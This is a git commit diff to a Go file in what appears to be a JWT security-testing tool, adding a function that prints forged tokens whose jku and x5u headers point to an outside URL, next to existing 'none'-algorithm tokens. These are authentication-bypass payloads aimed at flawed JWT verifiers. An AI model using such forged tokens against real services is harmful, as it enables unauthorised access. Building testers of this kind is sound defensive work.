a391270b98bc5fb5bf375924986820423a43a82b
hahwul <hahwul@gmail.com>
2020-07-09 01:06:12 +0900

    update

--- pkg/payload/payload.go
+++ pkg/payload/payload.go
@@ -11,6 +11,7 @@ import (
 // GenerateAllPayloads is printing all payloads
 func GenerateAllPayloads(token *jwt.Token) {
 	GenerateNonePayloads(token.Raw)
+	GenerateUrlPayloads(token.Raw)
 }
 
 // GenerateNonePayloads is printing none payloads
@@ -30,4 +31,22 @@ func GenerateNonePayloads(token string) {
 		fmt.Println("[" + v + "] " + baseHeader + "." + claims + ".")
 	}
 
+}
+
+// GenerateUrlPayloads is printing jku / x5u paylaod
+func GenerateUrlPayloads(token string) {
+	tokens := strings.Split(token, ".")
+	claims := tokens[1]
+	var pattern = []string{
+		"jku",
+		"x5u",
+	}
+
+	for k, v := range pattern {
+		_ = k
+		header := "{\"alg\":\"hs256\",\"" + v + "\":\"https://www.google.com\",\"typ\":\"JWT\"}"
+		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
+		fmt.Println("[" + v + "] " + baseHeader + "." + claims + ".")
+	}
+	
 }
